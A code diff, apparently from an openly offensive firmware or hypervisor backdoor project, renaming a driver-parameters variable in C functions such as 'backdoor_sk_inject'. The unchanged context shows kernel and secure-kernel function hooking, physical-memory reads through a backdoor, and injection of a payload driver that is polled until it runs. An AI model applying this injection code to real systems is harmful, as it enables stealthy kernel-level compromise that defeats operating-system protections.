@@ -616,7 +616,7 @@ _nt_found:
     uint8_t *driver_image = (uint8_t *)malloc(driver_image_size);
     if (driver_image)
     {
-        DRIVER_PARAMS DriverParams;
+        DRIVER_PARAMS loader_params;
 
         memset(driver_image, 0, driver_image_size);
         memcpy(driver_image, loader, loader_size);
@@ -647,14 +647,14 @@ _nt_found:
         }        
 
         // set up driver parameters
-        DriverParams.KernelBase = (PVOID)nt_base_virt;
-        DriverParams.DriverBase = (PVOID)driver_base_virt;
-        DriverParams.PayloadPagesCount = payload_mem_size / PAGE_SIZE;
-        DriverParams.bAllocOnly = alloc_only;
-        DriverParams.Cr3 = guest_pml4_addr;
+        loader_params.KernelBase = (PVOID)nt_base_virt;
+        loader_params.DriverBase = (PVOID)driver_base_virt;
+        loader_params.PayloadPagesCount = payload_mem_size / PAGE_SIZE;
+        loader_params.bAllocOnly = alloc_only;
+        loader_params.Cr3 = guest_pml4_addr;
 
         // copy driver parameters
-        memcpy(driver_image + driver_m_Params, &DriverParams, sizeof(DriverParams));
+        memcpy(driver_image + driver_m_Params, &loader_params, sizeof(loader_params));
 
         // save old code of kernel function to hook
         if (backdoor_phys_read(nt_func_phys, nt_func_buff, DRIVER_HOOK_SIZE_MAX) != 0)
@@ -1749,19 +1749,19 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
         goto _end;
     }
 
-    DRIVER_SK_PARAMS DriverParams;
+    DRIVER_SK_PARAMS loader_params;
     uint64_t driver_params_addr = 0;
 
     // set up driver parameters
-    DriverParams.KernelBase = (PVOID)sk_addr_virt;
-    DriverParams.DriverBase = (PVOID)mem;
-    DriverParams.PayloadPages = NULL;
-    DriverParams.PayloadPagesCount = image_size / PAGE_SIZE;
-    DriverParams.bAllocOnly = true;
-    DriverParams.CallCount = 0;
+    loader_params.KernelBase = (PVOID)sk_addr_virt;
+    loader_params.DriverBase = (PVOID)mem;
+    loader_params.PayloadPages = NULL;
+    loader_params.PayloadPagesCount = image_size / PAGE_SIZE;
+    loader_params.bAllocOnly = true;
+    loader_params.CallCount = 0;
 
     // copy driver parameters
-    memcpy(image + driver_params, &DriverParams, sizeof(DriverParams));
+    memcpy(image + driver_params, &loader_params, sizeof(loader_params));
 
     uint8_t sk_func_buff[DRIVER_HOOK_SIZE_MAX];
     uint8_t sk_func_jump[DRIVER_HOOK_SIZE_MAX];
@@ -1952,16 +1952,16 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     while (true)
     {
         // read DriverParams
-        if (backdoor_phys_read(driver_params_addr, (void *)&DriverParams, sizeof(DriverParams)) != 0)
+        if (backdoor_phys_read(driver_params_addr, (void *)&loader_params, sizeof(loader_params)) != 0)
         {
             goto _end;
         }
 
         // get address of the allocated memory
-        image_addr = (uint64_t)DriverParams.PayloadPages;
+        image_addr = (uint64_t)loader_params.PayloadPages;
 
         // check if kernel driver was executed
-        if (DriverParams.CallCount > 0)
+        if (loader_params.CallCount > 0)
         {
             printf("[+] Driver loader was executed!\n");
             break;
@@ -2022,12 +2022,12 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     }        
 
     // set up driver parameters
-    DriverParams.KernelBase = (PVOID)sk_addr_virt;
-    DriverParams.DriverBase = (PVOID)image_addr;
-    DriverParams.PayloadPages = NULL;
-    DriverParams.PayloadPagesCount = 0;
-    DriverParams.bAllocOnly = false;
-    DriverParams.CallCount = 0;
+    loader_params.KernelBase = (PVOID)sk_addr_virt;
+    loader_params.DriverBase = (PVOID)image_addr;
+    loader_params.PayloadPages = NULL;
+    loader_params.PayloadPagesCount = 0;
+    loader_params.bAllocOnly = false;
+    loader_params.CallCount = 0;
 
     m_quiet = true;
     driver_params_addr = 0;
@@ -2055,7 +2055,7 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     }
 
     // copy driver parameters
-    memcpy(image + driver_params, &DriverParams, sizeof(DriverParams));
+    memcpy(image + driver_params, &loader_params, sizeof(loader_params));
 
     // save original function code
     memcpy(image + driver_old_func, sk_func_buff, sk_func_saved_size);
@@ -2133,16 +2133,16 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     while (true)
     {
         // read DriverParams
-        if (backdoor_phys_read(driver_params_addr, (void *)&DriverParams, sizeof(DriverParams)) != 0)
+        if (backdoor_phys_read(driver_params_addr, (void *)&loader_params, sizeof(loader_params)) != 0)
         {
             goto _end;
         }
 
         // get address of the loaded payload
-        payload_image_addr = (uint64_t)DriverParams.PayloadPages;
+        payload_image_addr = (uint64_t)loader_params.PayloadPages;
 
         // check if kernel driver was executed
-        if (DriverParams.CallCount > 0)
+        if (loader_params.CallCount > 0)
         {
             printf("[+] Payload driver was executed!\n");
             break;
